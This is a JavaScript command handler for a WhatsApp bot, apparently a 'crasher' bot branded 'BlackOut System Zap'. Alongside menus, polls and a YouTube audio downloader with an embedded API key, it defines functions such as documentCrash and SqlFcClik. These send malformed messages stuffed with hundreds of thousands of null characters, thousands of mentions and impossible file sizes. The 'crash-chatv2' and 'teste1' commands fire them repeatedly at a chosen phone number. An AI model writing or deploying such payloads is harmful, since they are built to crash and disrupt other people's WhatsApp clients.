const {fs, util, chalk, moment, pino, logger, crypto, path, readline, yargs, _, Boom, sleep, store, rl, question, makeWASocket, generateWAMessageFromContent, getAggregateVotesInPollMessage, downloadContentFromMessage, useMultiFileAuthState, generateWAMessage, DisconnectReason, prepareWAMessageMedia, areJidsSameUser, getContentType, decryptPollVote, relayMessage, jidDecode, makeInMemoryStore, Browsers, proto, } = require('./dev/consts.js')

const dir = (relPath) => path.join(__dirname, relPath);
module.exports = async (snowi, m, chatUpdate, store, isUser) => {
try {
m.id = m.key.id
m.chat = m.key.remoteJid
m.fromMe = m.key.fromMe
m.isGroup = m.chat.endsWith('@g.us')
m.sender = await snowi.decodeJid(m.fromMe && snowi.user.id || m.participant || m.key.participant || m.chat || '')
if (m.isGroup) m.participant = snowi.decodeJid(m.key.participant) || ''
function getTypeM(message) {
    const type = Object.keys(message)
    var restype =  (!['senderKeyDistributionMessage', 'messageContextInfo'].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== 'messageContextInfo' && type[1]) || type[type.length - 1] || Object.keys(message)[0]
	return restype
}
m.mtype = getTypeM(m.message)
const info = m
const from = info.key.remoteJid
const target = from
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const getGroupAdmins = (participants) => {
        let admins = []
        for (let i of participants) {
            i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : ''
        }
        return admins || []
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
var prefix = global.prefixx ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefixx ?? global.prefix
const bardy = body || m.mtype;
const isCmd = bardy.startsWith(prefix);
const command = isCmd ? bardy.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = bardy.trim().split(/ +/).slice(1)
const text = args.join(" ")
const q = args.join(" ")
const sender = info.key.fromMe ? (snowi.user.id.split(':')[0]+'@s.whatsapp.net' || snowi.user.id) : (info.key.participant || info.key.remoteJid)
const botNumber = await snowi.decodeJid(snowi.user.id)
const senderNumber = sender.split('@')[0]
const userList = [
"0@s.whatsapp.net"
]
global.prefixx = ['','!','.',',','🐤','🗿'] 
const isCreator = userList.includes(sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = info.key.fromMe ? true : false
const sJid = "status@broadcast";
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await snowi.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata?.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var deviceC = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'
global.logColor = "\x1b[32m"
global.shapeColor = "\x1b[32m"
global.rootColor = "\x1b[32m"
function log(messageLines, title) {
    const top = `\n${shapeColor}` + "╭" + "─".repeat(50) + "╮" + "\x1b[0m"
    const bottom = `${shapeColor}╰` + "─".repeat(50) + "╯" + "\x1b[0m"
    const emptyLine = `${shapeColor}│` + " ".repeat(50) + "│" + "\x1b[0m"
    console.log(top);
    if (title) {
    const strip = title.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
    const titleLine = `${shapeColor}│` + " " + `${logColor}` +
    strip.padEnd(48) + " " + `${shapeColor}│`
    console.log(titleLine);
    console.log(emptyLine);
    }
    messageLines.forEach((line, i)=> {
    if (line.startsWith("\x1b")) {
        const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(51)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
    } else {
    const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(46)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
        }
        
    });
    console.log(emptyLine);
    console.log(bottom);
}
if (!isUser) {
if (m.message && m.isGroup) {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Group Chat';
    const INFOS = [
        `[ MESSAGE ] ${timeOnly}`,
        `=> Text: ${bardy}`,
        `=> Name: ${pushname || "unknown"}`,
        `=> From: ${info.sender}`,
        `=> In: ${groupName || info.chat}`,
        `=> Device: ${deviceC}`,
    ];
    log(INFOS, title);
} else {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Private Chat';
    const INFOS = [
        `[ MESSAGE ] ${timeOnly}`,
        `=> Text: ${bardy}`,
        `=> Name: ${pushname || "unknown"}`,
        `=> From: ${info.sender}`,
        `=> Device: ${deviceC}`,
    ];
    log(INFOS, title);
}
}
const reply = (text) => {
snowi.sendMessage(from, { text: text, mentions: [sender]},
{quoted: info}
).catch(e => {
return
})
}

//consts


//fuction 
const ZeppImg = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/AzXg4GAWjAQAACDAAABeUhb3AAAAAElFTkSuQmCC",
  "base64"
);

async function newsletterCrash(target) {
  var msg = generateWAMessageFromContent(target, {
    lottieStickerMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.15575-24/28891099_1968560060663009_4361029479081828586_n.enc?ccb=11-4&oh=01_Q5Aa2gHQFJPLsT-rSl2WVOe20Vh7NUQQZRmEs2_1ARxgFlWzbw&oe=68EA4671&_nc_sid=5e03e0&mms3=true",
          fileSha256: "fgQWpTTz3w6EqjE/tUwlNae3e7Xkf+9Fl+YC4cKn4NY=",
          fileEncSha256: "ikhGznm9q/z3w0D7vyuaj1qmI0w7p8gG1+sO/aYdeLU=",
          mediaKey: "HtsLpZ6/C980v8D9GpCMbaOR2JslbK2SnxFJJlqg+dE=",
          mimetype: "application/was",
          height: 512,
          width: 512,
          directPath: "/v/t62.15575-24/28891099_1968560060663009_4361029479081828586_n.enc?ccb=11-4&oh=01_Q5Aa2gHQFJPLsT-rSl2WVOe20Vh7NUQQZRmEs2_1ARxgFlWzbw&oe=68EA4671&_nc_sid=5e03e0",
          fileLength: 13862,
          pngThumbnail: ZeppImg,
          mediaKeyTimestamp: 1757601173,
          isAnimated: true,
          stickerSentTs: 1757602462702,
          isAvatar: false,
          isAiSticker: false,
          isLottie: true,
          messageContextInfo: {
            supportPayload: JSON.stringify({
              is_ai_message: false,
              ticket_id: crypto.randomBytes(28)
            }),
            messageAssociation: {
              associationType: 11,
              parentMessageKey: 2,
              messageIndex: 1
            }
          },
          contextInfo: {
            statusAttributionType: 2,
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: "13135550002@s.whatsapp.net"
            },
            externalAdReply: {
              body: "🕷️「BlackOut System Zap」",
              mediaType: 1,
              thumbnail: ZeppImg,
              thumbnailUrl: "https://Wa.me/stickerpack/𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
              sourceUrl: "https://Wa.me/stickerpack/𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘   ",
              renderLargerThumbnail: false,
              showAdAttribution: true
            },
            dissepearingMode: {
              initiator: "INITIATED_BY_ME",
              trigger: "ACCOUNT_SETTING"
            },
            expiration: Date.now() - 1000,
            ephemeralSettingTimestamp: -9999,
            channelMessage: true,
            isGroupMentions: true
          }
        }
      }
    }
  }, {});
  await snowi.relayMessage(target, msg.message, { messageId: msg.key.id });
}
//fuction 2 
async function invisibleMultiJid(target, jiAiDi) {
for(let I = 0; I < 10; I++) {
  await snowi.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🕷️「BlackOut System Zap」",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "-",
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
              externalAdReply: {
                body: "🕷️「BlackOut System Zap」",
                mediaType: 1,
                thumbnail: ZeppImg,
                sourceUrl: "https://xnnx.com",
                sourceType: "whatsapp",
                cdogio: 'cdogio' + Math.floor(Math.random() * 1000000),
                sourceId: String(Math.floor(Math.random() * 900000000) + 100000),
                ctwaClid: 'clid' + Math.floor(Math.random() * 1000000),
                ctaPayload: 'payload' + Math.random().toString(36).substring(2, 10),
                ref: "referencia",
                mediaType: 1,
                clickToWhatsappCall: true,
                adContextPreviewDismissed: false,
                sourceApp: "com.whatsapp",
                automatedGreetingMessageShown: true,
                greetingMessageBody: "x",
                disableNudge: true,
                originalImageUrl: "https://xnnx.com"
              }
            },
          }
        }
      }
    }, jiAiDi ? { participant: { jid:target } } : {});
  }
}
//fuction3 
async function invisibleMultiJid2(target) {
for(let I = 0; I < 10; I++) {
snowi.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "hi",
              format: "jx"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "kkk",
              version: 3
            },
            contextInfo: {
              mentionedJid: [],
              externalAdReply: {
                body: "Jx",
                mediaType: 1,
                thumbnail: ZeppImg,
                sourceUrl: "https://www.instagram.com/Jhonix",
                sourceType: "whatsapp",
                cdogio: 'cdogio' + Math.floor(Math.random() * 1000000),
                sourceId: String(Math.floor(Math.random() * 900000000) + 100000),
                ctwaClid: 'clid' + Math.floor(Math.random() * 1000000),
                ctaPayload: 'payload' + Math.random().toString(36).substring(2, 10),
                ref: "referencia",
                mediaType: 1,
                clickToWhatsappCall: true,
                adContextPreviewDismissed: false,
                sourceApp: "myapp",
                automatedGreetingMessageShown: true,
                greetingMessageBody: "x",
                disableNudge: true,
                originalImageUrl: "https://files.catbox.moe/g9j9fl.webp"
              }
            },
          }
        }
      }
    }, {});
}
}
//función 

async function documentCrash(target) {
  await snowi.relayMessage(target, {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/18970868_1451610396007067_2477655932894905749_n.enc?ccb=11-4&oh=01_Q5Aa2gG5YtBm2C0eu_nYievlS-3dhLAjC8Ne70VK9vO12EPF_g&oe=68EA391C&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/zip",
      fileSha256: "gXL6XotbKW05nCSSa/XlvXeMqOsMkq37Y/XrewO5a0g=",
      fileLength: 99999999999,
      pageCount: 999999999,
      mediaKey: "HduCwhWMz3owQVo4188Om/0YCAl7ws8Zls0hdLD5aEY=",
      fileName: "🕷️「BlackOut System Zap」, 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
      fileEncSha256: "9kYcZz1osvxhOoL1hH0el9ZhUYh9z0uk2McxFTOpiHU=",
      directPath: "/v/t62.7119-24/18970868_1451610396007067_2477655932894905749_n.enc?ccb=11-4&oh=01_Q5Aa2gG5YtBm2C0eu_nYievlS-3dhLAjC8Ne70VK9vO12EPF_g&oe=68EA391C&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1757598955",
      jpegThumbnail: ZeppImg,
      contactVcard: true,
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550202@s.whatsapp.net"
        },
        participant: "13135550302@bot",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() * 100
          }
        },
        remoteJid: "kkk"
      }
    }
  }, {});
}
//fuction 
async function SqlFcClik(target2) {
  try {
    const Msg = {
      viewOnceMessage: {
        message: {
          body: {
            text: "./VinzSend??..",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJSON: "\u0000".repeat(300000),
              },
              {
                name: "call_permission_request",
                buttonParamsJSON: "\u0000".repeat(300000),
              },
            ],
            messageParamsJson: "{}",
          },
        },
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: "Hi!",
            body: `${"\u0000".repeat(300000)}`,
            mediaType: 1,
            renderLargerThumbnail: true,
            thumbnailUrl: null,
            sourceUrl: "https://Wa.me/stickerpack/vinz-ganteng",
          },
        },
        businessMessageForwardInfo: {
          businessOwnerJid: target2,
        },
        isSampled: true,
        mentionedJid: [target2],
      },
    };

    // 👇 Cambiado: destino real, no broadcast
    await snowi.relayMessage(target2, Msg.viewOnceMessage, {
      messageId: null,
    });
  } catch (err) {
    console.error("❌ Error en SqlFcClik:", err);
  }
}
switch(command) {
case 'teste1':
  if (!isBot && !isCreator) return;

  let pelaku2 =
    m.mentionedJid && m.mentionedJid.length > 0
      ? m.mentionedJid[0]
      : m.quoted
      ? m.quoted.sender
      : q
      ? q.replace(/[^0-9]/g, '')
      : null;

  if (!pelaku2) return reply("Ingresa un número válido.");

  let target2 = pelaku2.includes('@s.whatsapp.net')
    ? pelaku2
    : pelaku2 + '@s.whatsapp.net';

  for (let i = 0; i < 10; i++) {
    await SqlFcClik(target2);
  }
  break;
case 'crash-chatv2':
  if (!isBot && !isCreator) return; 

    documentCrash(target)
    await sleep(5000)
    documentCrash(target)
    await sleep(5000)
    documentCrash(target)
    await sleep(6000)
    documentCrash(target)
    await sleep(5000)
    documentCrash(target)
    await sleep(5000)
    documentCrash(target)
    documentCrash(target)
    await sleep(5000)
    documentCrash(target)
    await sleep(5000)
    documentCrash(target)
    await sleep(5000)
    documentCrash(target)
    
  
  break;
  case "mn": {
if (!isBot && !isCreator) return
snowi.pollMenu(target, `MENU`, [
    { vote: '️Me', cmd: `me` },
    { vote: 'Idk', cmd: `idk` }
])
}
break


case "poll": {
if (!isBot && !isCreator) return
snowi.pollMenu(target, `MENU`, [
    { vote: '️Me', cmd: `me` },
    { vote: 'Button Menu', cmd: `menu` },
    { vote: 'Chat id', cmd: `jid` },
    { vote: 'Idk', cmd: `idk` }
])
}
break
case 'ola': {
if (!isBot && !isCreator) return
try {
const k = {
  id: await snowi.relayMessage(m.chat, {
    requestPaymentMessage: {
      currencyCodeIso4217: "IDR",
      amount1000: "1000000000",
      requestFrom: snowi.user.id,
      noteMessage: {
        extendedTextMessage: { text: "https://chat.whatsapp.com/IrlMYf6R9YV5NBU6OgPm1v?mode=wwc" }
      },
      expiryTimestamp: "0",
      amount: {
        value: "1000000000",
        offset: 1000,
        currencyCode: "IDR"
      },
      background: {
        id: "dzy",
        fileLength: "999999",
        width: -99999,
        height: -99999,
        mimetype: "IMAGE",
        placeholderArgb: 20816,
        textArgb: 4100048132,
        subtextArgb: 2940630892
      }
    }
  }, {})
}

await snowi.relayMessage(m.chat, {
  declinePaymentRequestMessage: {
    key: k.id
  }
}, {})

} catch (e) {
console.log(e)
await snowi.sendMessage(m.chat, { text: 'Error' })
}
}
break


case "menu": {
if (!isBot && !isCreator) return
let mediaImage = await prepareWAMessageMedia({ 
    "image": {
       "url": dir("/dev/snowiDev.jpg")
      }
    },
  { "upload": snowi.waUploadToServer}
  )
  mediaImage = mediaImage.imageMessage
let msg = {
  "viewOnceMessage": {
    "message": {
      "buttonsMessage": {
        "imageMessage": mediaImage,
        "contentText": "︀",
        "buttons": [
          {
            "buttonId": "me",
            "buttonText": {
              "displayText": "Me"
            },
            "type": 1
          },
          {
            "buttonId": "poll",
            "buttonText": {
              "displayText": "Poll"
            },
            "type": 1
          },
          {
            "buttonId": "jid",
            "buttonText": {
              "displayText": "Chat id"
            },
            "type": 1,
            "nativeFlowInfo": {
            "name": "single_select",
            "paramsJson": JSON.stringify({
                "title": "Menu",
                "sections": [
                    {
                "title": "LIST",
                "rows": [
                {
                    "title": "Poll",
                    "description": "Poll Menu",
                    "id": "poll",
                },
                {
                    "title": "Me",
                    "description": "my number",
                    "id": "me",
                },
                {
                    "title": "Jid",
                    "description": "Get chat jid",
                    "id": "jid",
                },
                {
                    "title": "Refresh",
                    "description": "Fix waiting for this message",
                    "id": "refresh",
                },
                {
                    "title": "Idk",
                    "description": "Hacker content",
                    "id": "idk",
                },
                ]
                    }
                ]
            })
            }
          }
        ],
        "headerType": 4,
      }
    }
  }
}
snowi.relayMessage(target,msg,{})
}
break
case 'ytmp3': {
    if (!isBot && !isCreator) return;
    if (!text) return reply(`Usa el comando proporcionando un enlace de YouTube o el nombre de una canción.\n\n*Ejemplos:*\n*${prefix}ytmp3* https://youtu.be/Q1Hta4K6qVM\n*${prefix}ytmp3* Bad Bunny - Monaco`);

    // Expresión regular para detectar si el texto es una URL de YouTube
    const youtubeUrlRegex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/;
    const isYoutubeUrl = youtubeUrlRegex.test(text);
    let finalUrl = '';

    try {
        if (isYoutubeUrl) {
            // Si es una URL, la usamos directamente
            finalUrl = text;
        } else {
            // Si no es una URL, la tratamos como una búsqueda
            await reply(`🔎 Buscando "${text}"...`);
            const searchApiUrl = `https://api.stellarwa.xyz/yt/search?query=${encodeURIComponent(text)}&apikey=stellar-4Mdsa9zn`;
            const searchResponse = await axios.get(searchApiUrl);

            // Verificamos si la API encontró resultados y tomamos el primero
            if (searchResponse.data && searchResponse.data.results && searchResponse.data.results.length > 0) {
                finalUrl = searchResponse.data.results[0].url; // Se asume que la API devuelve la URL en este campo
            } else {
                return reply(`❌ No se encontraron resultados para "${text}".`);
            }
        }

        // --- Lógica de descarga (esta parte es la misma que antes) ---
        await reply('📥 Descargando y enviando el audio, por favor espera...');
        const downloadApiUrl = `https://api.stellarwa.xyz/dow/ytmp3?url=${encodeURIComponent(finalUrl)}&apikey=stellar-4Mdsa9zn`;
        const { data } = await axios.get(downloadApiUrl);

        if (data && data.status === 'success' && data.data && data.data.url) {
            await snowi.sendMessage(from, {
                audio: { url: data.data.url },
                mimetype: 'audio/mpeg',
                fileName: `${data.data.title}.mp3`
            }, { quoted: info });
        } else {
            reply('No se pudo procesar la canción. Inténtalo de nuevo.');
        }

    } catch (error) {
        console.error('Error en el comando ytmp3:', error);
        reply('Ocurrió un error inesperado al procesar tu solicitud.');
    }
}
break;

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case "me": {
if (!isBot && !isCreator) return
reply(sender)
} break

case "jid": {
if (!isBot && !isCreator) return
reply(from)
} break

case "idk": {
if (!isBot && !isCreator) return
let mediaImage = await prepareWAMessageMedia({ 
    "image": {
       "url": dir("/dev/snowiDev.jpg")
      }
    },
  { "upload": snowi.waUploadToServer}
  )
  mediaImage = mediaImage.imageMessage
snowi.sendjson(target, {
"viewOnceMessage": {
"message": {
"interactiveMessage": {
    "header": {
        "imageMessage": mediaImage,
        "hasMediaAttachment": false,
        "title": "\0"
    },
    "body": {
        "text": ""
    },
    "nativeFlowMessage": {
        "buttons": [
    {
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
            "icon": "REVIEW",
            "flow_cta": "review",
            "flow_message_version": "3"
        })
    },{
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
            "icon": "PROMOTION",
            "flow_cta": "promotion",
            "flow_message_version": "3"
        })
    },{
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
            "icon": "DOCUMENT",
            "flow_cta": "document",
            "flow_message_version": "3"
            })
    },{
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
            "icon": "DEFAULT",
            "flow_cta": "default",
            "flow_message_version": "3"
        })
    },{
            "name": "single_select",
            "buttonParamsJson": JSON.stringify({
                "title": "Menu",
                "sections": [
                    {
                "title": "LIST",
                "rows": [
                {
                    "title": "Poll",
                    "description": "Poll Menu",
                    "id": "poll",
                },
                {
                    "title": "Me",
                    "description": "my number",
                    "id": "me",
                },
                {
                    "title": "Jid",
                    "description": "Get chat jid",
                    "id": "jid",
                },
                {
                    "title": "Refresh",
                    "description": "Fix waiting for this message",
                    "id": "refresh",
                },
                {
                    "title": "Idk",
                    "description": "Hacker content",
                    "id": "idk",
                },
                ]
                    }
                ]
            })
            }
        ],
        "messageParamsJson": JSON.stringify({
            "bottom_sheet": {
            "in_thread_buttons_limit": 1,
            "divider_indices": [1,2,3,4,5],
            "list_title": "I love woman",
            "button_title": "\0"
            },
            "limited_time_offer": {
            "text": "⃪𝐓͢𝐬𝐌",
            "url": "satanicMirror",
            "copy_code": "snøwi modder",
            },
            "tap_target_configuration": {
            "title": "🍀⃕͜𝐓͢𝐬𝐌 ⾘𝐌͢𝐨𝐝𝐝͢𝐞⃜𝐫",
            "description": "snøwi modder",
            "canonical_url": "\0",
            "domain": "\0",
            "button_index": 0
            }
        })
    }
}
}
}     
})
} break

case "refresh": {
if (!isBot && !isCreator) return
function cleanFolder(folderPath, excludeFile) {
    fs.readdir(folderPath, (_, files) => {
        files.forEach(file => {
            if (file !== excludeFile) {
                fs.unlink(path.join(folderPath, file), () => {});
            }
        });
    });
}
cleanFolder(dir('./dev/session'), 'creds.json');
} break

default:
}

} catch (err) {console.log(util.format(err))}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
